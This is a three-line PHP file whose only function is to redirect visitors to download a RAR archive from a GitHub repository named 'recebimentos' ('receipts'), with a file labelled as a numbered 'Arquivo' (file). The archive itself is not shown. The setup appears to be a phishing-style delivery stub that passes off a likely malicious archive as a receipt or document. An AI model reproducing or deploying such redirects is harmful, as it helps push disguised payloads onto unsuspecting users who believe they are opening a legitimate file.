<?php
header("Location:    https://raw.githubusercontent.com/recebimentos/2018/master/Arquivo-22098%20D.rar");
?>